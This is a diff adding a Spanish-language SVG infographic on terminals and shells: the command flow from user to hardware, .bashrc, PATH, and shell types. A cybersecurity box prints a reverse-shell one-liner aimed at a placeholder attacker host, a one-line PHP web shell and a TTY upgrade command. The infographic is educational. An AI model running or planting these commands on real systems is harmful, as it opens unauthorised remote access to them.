@@ -1,0 +1,133 @@
+<svg viewBox="0 0 1020 510" xmlns="http://www.w3.org/2000/svg" font-family="'JetBrains Mono', monospace">
+  <rect width="1020" height="510" fill="#0a0a0f"/>
+  <defs>
+    <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
+      <path d="M 40 0 L 0 0 0 40" fill="none" stroke="rgba(0,255,159,0.03)" stroke-width="1"/>
+    </pattern>
+    <marker id="ga" markerWidth="7" markerHeight="7" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#00ff9f"/></marker>
+    <marker id="ba" markerWidth="7" markerHeight="7" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L7,3 z" fill="#4d96ff"/></marker>
+  </defs>
+  <rect width="1020" height="510" fill="url(#grid)"/>
+
+  <!-- TITLE -->
+  <text x="48" y="56" fill="#1a1a2a" font-size="44" font-weight="700">TERMINAL · SHELL</text>
+  <text x="46" y="54" fill="#e8eaf0" font-size="44" font-weight="700">TERMINAL · SHELL</text>
+  <text x="48" y="72" fill="#00ff9f" font-size="9" letter-spacing="3">EL INTÉRPRETE ENTRE HUMANO Y MÁQUINA</text>
+  <line x1="48" y1="82" x2="430" y2="82" stroke="#1e1e2e" stroke-width="1"/>
+
+  <!-- LEFT: flow diagram -->
+  <text x="48" y="102" fill="#6b6b8a" font-size="9" letter-spacing="2">// FLUJO DE COMUNICACIÓN</text>
+
+  <!-- User -->
+  <rect x="48" y="112" width="380" height="36" rx="3" fill="#12121a" stroke="#6b6b8a" stroke-width="1"/>
+  <rect x="48" y="112" width="4" height="36" fill="#6b6b8a"/>
+  <text x="238" y="130" text-anchor="middle" fill="#6b6b8a" font-size="10" font-weight="700">USUARIO</text>
+  <text x="238" y="142" text-anchor="middle" fill="#3a3a5a" font-size="8">escribe: ls -la</text>
+
+  <line x1="238" y1="150" x2="238" y2="162" stroke="#1e1e2e" stroke-width="1.5" marker-end="url(#ga)"/>
+
+  <!-- Terminal -->
+  <rect x="48" y="164" width="380" height="36" rx="3" fill="#12121a" stroke="#ffd93d" stroke-width="1"/>
+  <rect x="48" y="164" width="4" height="36" fill="#ffd93d"/>
+  <text x="238" y="182" text-anchor="middle" fill="#ffd93d" font-size="10" font-weight="700">TERMINAL (emulador)</text>
+  <text x="238" y="194" text-anchor="middle" fill="#3a3a5a" font-size="8">GNOME Terminal · iTerm2 · Windows Terminal</text>
+
+  <line x1="238" y1="202" x2="238" y2="214" stroke="#1e1e2e" stroke-width="1.5" marker-end="url(#ga)"/>
+
+  <!-- Shell -->
+  <rect x="48" y="216" width="380" height="44" rx="3" fill="#12121a" stroke="#00ff9f" stroke-width="2"/>
+  <rect x="48" y="216" width="4" height="44" fill="#00ff9f"/>
+  <text x="238" y="234" text-anchor="middle" fill="#00ff9f" font-size="12" font-weight="700">SHELL — El intérprete</text>
+  <text x="238" y="248" text-anchor="middle" fill="#6b6b8a" font-size="9">bash · zsh · sh · fish · dash</text>
+  <text x="238" y="258" text-anchor="middle" fill="#3a3a5a" font-size="8">interpreta el comando y lo envía al kernel</text>
+
+  <line x1="238" y1="262" x2="238" y2="274" stroke="#1e1e2e" stroke-width="1.5" marker-end="url(#ga)"/>
+
+  <!-- Kernel -->
+  <rect x="48" y="276" width="380" height="36" rx="3" fill="#12121a" stroke="#ff9f43" stroke-width="1.5"/>
+  <rect x="48" y="276" width="4" height="36" fill="#ff9f43"/>
+  <text x="238" y="294" text-anchor="middle" fill="#ff9f43" font-size="10" font-weight="700">KERNEL</text>
+  <text x="238" y="306" text-anchor="middle" fill="#3a3a5a" font-size="8">ejecuta la llamada al sistema</text>
+
+  <line x1="238" y1="314" x2="238" y2="326" stroke="#1e1e2e" stroke-width="1.5" marker-end="url(#ga)"/>
+
+  <!-- Hardware -->
+  <rect x="48" y="328" width="380" height="36" rx="3" fill="#12121a" stroke="#ff6b6b" stroke-width="1"/>
+  <rect x="48" y="328" width="4" height="36" fill="#ff6b6b"/>
+  <text x="238" y="346" text-anchor="middle" fill="#ff6b6b" font-size="10" font-weight="700">HARDWARE</text>
+  <text x="238" y="358" text-anchor="middle" fill="#3a3a5a" font-size="8">disco · CPU · red</text>
+
+  <!-- .bashrc note -->
+  <rect x="48" y="382" width="380" height="44" rx="2" fill="#12121a" stroke="#c77dff" stroke-width="1"/>
+  <rect x="48" y="382" width="4" height="44" fill="#c77dff"/>
+  <text x="62" y="400" fill="#c77dff" font-size="9" font-weight="700">~/.bashrc — configuración personal</text>
+  <text x="62" y="414" fill="#6b6b8a" font-size="8">alias ll='ls -la'  ·  export PATH="..."</text>
+  <text x="62" y="424" fill="#3a3a5a" font-size="7">se ejecuta en cada nueva terminal interactiva</text>
+
+  <!-- PATH -->
+  <rect x="48" y="442" width="380" height="44" rx="2" fill="#0d0d14" stroke="#1e1e2e" stroke-width="1"/>
+  <text x="62" y="460" fill="#00ff9f" font-size="9">$ echo $PATH</text>
+  <text x="62" y="474" fill="#b0b0c8" font-size="8">/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</text>
+  <text x="62" y="484" fill="#3a3a5a" font-size="7">orden de búsqueda de ejecutables</text>
+
+  <!-- RIGHT divider -->
+  <line x1="460" y1="30" x2="460" y2="490" stroke="#1e1e2e" stroke-width="1"/>
+
+  <!-- RIGHT: shell types -->
+  <text x="486" y="48" fill="#6b6b8a" font-size="9" letter-spacing="2">// TIPOS DE SHELL</text>
+
+  <!-- bash -->
+  <rect x="486" y="58" width="510" height="60" rx="2" fill="#12121a" stroke="#00ff9f" stroke-width="1.5"/>
+  <rect x="486" y="58" width="4" height="60" fill="#00ff9f"/>
+  <text x="500" y="76" fill="#00ff9f" font-size="12" font-weight="700">bash — Bourne Again Shell</text>
+  <text x="500" y="92" fill="#6b6b8a" font-size="9">La más usada. Por defecto en la mayoría de Linux.</text>
+  <text x="500" y="106" fill="#3a3a5a" font-size="8">1989 · Brian Fox · Proyecto GNU · base para scripting</text>
+
+  <!-- zsh -->
+  <rect x="486" y="126" width="510" height="52" rx="2" fill="#12121a" stroke="#4d96ff" stroke-width="1"/>
+  <rect x="486" y="126" width="4" height="52" fill="#4d96ff"/>
+  <text x="500" y="144" fill="#4d96ff" font-size="11" font-weight="700">zsh — Z Shell</text>
+  <text x="500" y="159" fill="#6b6b8a" font-size="9">Bash mejorada. Por defecto en macOS. Oh My Zsh.</text>
+  <text x="500" y="171" fill="#3a3a5a" font-size="8">autocompletado avanzado · temas · plugins</text>
+
+  <!-- sh -->
+  <rect x="486" y="186" width="245" height="52" rx="2" fill="#12121a" stroke="#6b6b8a" stroke-width="1"/>
+  <rect x="486" y="186" width="4" height="52" fill="#6b6b8a"/>
+  <text x="500" y="204" fill="#e8eaf0" font-size="11" font-weight="700">sh — Bourne Shell</text>
+  <text x="500" y="219" fill="#6b6b8a" font-size="9">Original (1979). Universal.</text>
+  <text x="500" y="231" fill="#3a3a5a" font-size="8">máxima compatibilidad</text>
+
+  <!-- fish -->
+  <rect x="741" y="186" width="255" height="52" rx="2" fill="#12121a" stroke="#6bcb77" stroke-width="1"/>
+  <rect x="741" y="186" width="4" height="52" fill="#6bcb77"/>
+  <text x="755" y="204" fill="#6bcb77" font-size="11" font-weight="700">fish — Friendly Shell</text>
+  <text x="755" y="219" fill="#6b6b8a" font-size="9">Moderna. UX amigable.</text>
+  <text x="755" y="231" fill="#3a3a5a" font-size="8">ideal para principiantes</text>
+
+  <!-- security section -->
+  <text x="486" y="262" fill="#6b6b8a" font-size="9" letter-spacing="2">// SHELLS EN CIBERSEGURIDAD</text>
+
+  <rect x="486" y="272" width="510" height="200" rx="2" fill="#12121a" stroke="#1e1e2e" stroke-width="1"/>
+  <rect x="486" y="272" width="4" height="200" fill="#ff6b6b"/>
+
+  <text x="500" y="292" fill="#ff6b6b" font-size="10" font-weight="700">Reverse Shell</text>
+  <text x="500" y="307" fill="#6b6b8a" font-size="9">La víctima conecta su shell al atacante</text>
+  <rect x="500" y="312" width="482" height="20" rx="1" fill="#0a0a0f"/>
+  <text x="508" y="325" fill="#b0b0c8" font-size="8">bash -i &gt;&amp; /dev/tcp/ATACANTE/4444 0&gt;&amp;1</text>
+
+  <line x1="494" y1="336" x2="988" y2="336" stroke="#1e1e2e" stroke-width="0.5"/>
+
+  <text x="500" y="354" fill="#ffd93d" font-size="10" font-weight="700">Web Shell</text>
+  <text x="500" y="369" fill="#6b6b8a" font-size="9">Script subido al servidor para ejecutar comandos</text>
+  <rect x="500" y="374" width="482" height="20" rx="1" fill="#0a0a0f"/>
+  <text x="508" y="387" fill="#b0b0c8" font-size="8">system($_GET['cmd']);  // PHP web shell básica</text>
+
+  <line x1="494" y1="398" x2="988" y2="398" stroke="#1e1e2e" stroke-width="0.5"/>
+
+  <text x="500" y="416" fill="#c77dff" font-size="10" font-weight="700">Shell Upgrade — TTY interactiva</text>
+  <text x="500" y="431" fill="#6b6b8a" font-size="9">Convertir shell básica en interactiva completa</text>
+  <rect x="500" y="436" width="482" height="20" rx="1" fill="#0a0a0f"/>
+  <text x="508" y="449" fill="#b0b0c8" font-size="8">python3 -c 'import pty; pty.spawn("/bin/bash")'</text>
+
+  <text x="500" y="466" fill="#3a3a5a" font-size="8">PATH hijacking · bind shell · shell escape (privesc)</text>
+</svg>
